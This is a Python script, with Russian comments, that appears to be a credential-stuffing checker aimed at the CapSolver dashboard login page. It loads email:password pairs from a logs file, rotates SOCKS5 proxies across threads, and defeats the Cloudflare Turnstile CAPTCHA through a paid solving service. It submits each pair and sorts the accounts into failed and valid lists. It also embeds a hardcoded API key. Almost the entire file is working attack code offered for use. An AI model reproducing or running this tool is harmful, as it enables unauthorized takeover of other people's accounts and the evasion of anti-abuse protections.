import os
import re
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

from bs4 import BeautifulSoup
from colorama import init
from curl_cffi import requests

init(autoreset=True)

API_KEY = 'CAI-709AC2958181C76A0B41EBA655AD1268'
WEBSITE_KEY = '0x4AAAAAAAVrOwQWPlm3Bnr5'
LOGIN_URL = 'https://dashboard.capsolver.com/passport/login'


def convert_proxies(file_path):
    updated_proxies = []
    socks5_regex = re.compile(r'^socks5://.+')

    with open(file_path, 'r') as infile:
        for line in infile:
            line = line.strip()
            if not line:
                continue

            if socks5_regex.match(line):
                updated_proxies.append(line)
                continue

            parts = line.split(':')
            if len(parts) == 4:
                host = parts[0]
                port = parts[1]
                username = parts[2]
                password = parts[3]
                new_proxy_format = f"socks5://{username}:{password}@{host}:{port}"
                updated_proxies.append(new_proxy_format)
            else:
                print(f"Incorrect proxy format: {line}")
                updated_proxies.append(line)

    with open(file_path, 'w') as outfile:
        for proxy in updated_proxies:
            outfile.write(proxy + '\n')


def ensure_file_exists(file_path):
    if not os.path.isfile(file_path):
        open(file_path, 'a').close()


def load_proxies(file_path):
    proxies = []
    with open(file_path, 'r') as file:
        for line in file:
            proxies.append(line.strip())
    return proxies


def load_unique_entries(file_path):
    with open(file_path, 'r') as file:
        entries = set(line.strip().split(":")[0] for line in file if line.strip())
    return entries


def load_valid_entries(file_path="valid.txt"):
    with open(file_path, 'r') as file:
        entries = set(line.strip().split(":")[0] for line in file if line.strip())
    return entries


def remove_processed_entry(email, password, file_path="logs.txt"):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    with open(file_path, 'w') as file:
        for line in lines:
            if line.strip() != f"{email}:{password}":
                file.write(line)


def solve_captcha(metadata_action=None, metadata_cdata=None):
    while True:
        url = "https://api.capsolver.com/createTask"
        task = {
            "type": "AntiTurnstileTaskProxyLess",
            "websiteURL": LOGIN_URL,
            "websiteKey": WEBSITE_KEY,
        }
        if metadata_action or metadata_cdata:
            task["metadata"] = {}
            if metadata_action:
                task["metadata"]["action"] = metadata_action
            if metadata_cdata:
                task["metadata"]["cdata"] = metadata_cdata

        data = {
            "clientKey": API_KEY,
            "task": task
        }

        response_data = requests.post(url, json=data).json()

        if 'errorCode' in response_data:
            print("Error creating task:", response_data.get('errorDescription', 'No description provided'))
            time.sleep(5)
            continue

        captcha_id = response_data.get('taskId')
        if not captcha_id:
            print("Unexpected response format when creating captcha task:", response_data)
            time.sleep(5)
            continue

        while True:
            url = "https://api.capsolver.com/getTaskResult"
            data = {"clientKey": API_KEY, "taskId": captcha_id}

            result = requests.post(url, json=data).json()

            if 'errorCode' in result:
                print("Error getting captcha result:", result.get('errorDescription', 'No description provided'))
                time.sleep(5)
                break

            if 'status' not in result:
                print("Unexpected response format when getting captcha result:", result)
                time.sleep(5)
                break

            if result['status'] == 'ready':
                return result['solution']['token']

            time.sleep(5)


def login(email, password, proxies, proxy_index, lock, processed_entries, failed_entries, valid_entries, valid_count):
    with lock:
        if email in processed_entries or email in valid_entries:
            print(f'{email} is already processed or valid')
            remove_processed_entry(email, password)
            return
        if email in failed_entries:
            print(f'{email} is already processed')
            remove_processed_entry(email, password)
            return

    # + 3 - количество потоков. если бы было 5 потоков, нужно поставить (proxy_index + 5)
    proxy_index = (proxy_index + 3) % len(proxies)
    session = requests.Session()
    max_attempts = 15
    attempt = 0

    while attempt < max_attempts:
        proxy = {
            "http": proxies[proxy_index % len(proxies)],
            "https": proxies[proxy_index % len(proxies)]
        }

        try:
            session.headers.update({
                "Content-Language": "en-EN",
                "Referer": LOGIN_URL,
                "Content-Type": "*/*",
                "Accept": "*/*",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            })

            response = session.get(LOGIN_URL, proxies=proxy, timeout=10)
            print("Статус-код:", response.status_code)
            with open('response.html', 'w') as f:
                f.write(response.text)

            soup = BeautifulSoup(response.text, 'html.parser')

            try:
                email_input = soup.find('input', {'name': 'email'})
                password_input = soup.find('input', {'name': 'password'})

                login_data = {
                    'email': email,
                    'password': password
                }

                if email_input and password_input:
                    try:
                        hidden_fields = soup.find_all('input', {'type': 'hidden'})
                        for field in hidden_fields:
                            if field.get('name') and field.get('value'):
                                login_data[field['name']] = field['value']
                    except:
                        print('Hidden fields not found')
                        continue

                    token = solve_captcha()
                    if not token:
                        print("Failed to solve CAPTCHA.")
                        return
                    login_data['cf-turnstile-response'] = token

                    login_response = session.post(LOGIN_URL, data=login_data, proxies=proxy, allow_redirects=True,
                                                  timeout=10)

                    print("Статус-код после логина:", login_response.status_code)
                    with open('response.html', 'w') as outfile:
                        outfile.write(login_response.text)
                        print("Ответ после логина записан")
                else:
                    print("Не удалось найти поля ввода для email или password.")
                break
            except Exception as e:
                print(e)
        except:
            attempt += 1
            # + 3 - количество потоков. если бы было 5 потоков, нужно поставить (proxy_index + 5)
            proxy_index = (proxy_index + 3) % len(proxies)
            time.sleep(1)

    with lock:
        if email not in failed_entries:
            with open("base_failed.txt", "a") as failed_file:
                failed_file.write(f"{email}:{password}\n")
            failed_entries.add(email)
            remove_processed_entry(email, password)


def main():
    convert_proxies("proxies.txt")

    ensure_file_exists("logs.txt")
    ensure_file_exists("base.txt")
    ensure_file_exists("base_failed.txt")
    ensure_file_exists("valid.txt")

    proxies = load_proxies("proxies.txt")
    credentials = []
    with open("logs.txt", 'r', encoding='utf-8', errors='replace') as log_file:
        for line in log_file:
            line = line.strip()
            if line:
                credentials.append(line.split(":", 1))

    processed_entries = load_unique_entries("base.txt")
    failed_entries = load_unique_entries("base_failed.txt")
    valid_entries = load_valid_entries("valid.txt")

    lock = threading.Lock()
    valid_count = [0]

    # max_workers=3 количество потоков. если бы было 5 потоков, нужно сверху изменить на (proxy_index + 5) в двух случаях
    # там стоят комментарии, подобные этим
    with ThreadPoolExecutor(max_workers=3) as executor:
        future_to_email = {
            executor.submit(login, email, password, proxies, i, lock, processed_entries, failed_entries,
                            valid_entries, valid_count): email
            for i, (email, password) in enumerate(credentials)
        }
        for future in as_completed(future_to_email):
            future.result()

    print(f'\nКоличество валидных аккаунтов: {valid_count}')
    input("Нажмите Enter, чтобы закрыть...")


if __name__ == "__main__":
    main()
